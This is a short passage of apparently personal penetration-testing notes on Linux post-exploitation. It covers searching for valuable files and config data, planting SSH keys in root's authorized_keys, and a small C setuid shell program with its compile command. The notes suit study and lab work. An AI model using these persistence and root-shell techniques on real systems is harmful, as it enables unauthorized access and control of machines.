4. Search for important files which may grant more access, see [[Valuable Files]] and then [[3. Exploitation/File Types and Data/1. Guide|Guide]]
5. Search for important information within running or interesting applications, especially the application used to gain access, e.g. vulnerable database and its configuration files Privilege Escalation

## Getting Root Access


## Using Root Access

How to use the root access to gain access

### SSH Keys

Create SSH keys for the Root account then just connect.
Input ssh key into .ssh, `.ssh/authorized_keys`

### File Creation to Open a Shell

Create a file using the root privilege, or enable its privileges:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
	setreuid(0, 0);
	execve("/bin/sh", NULL, NULL); 
}
```

Compile the file:

```
gcc -o shell /opt/shells/setuid/exec.c
```
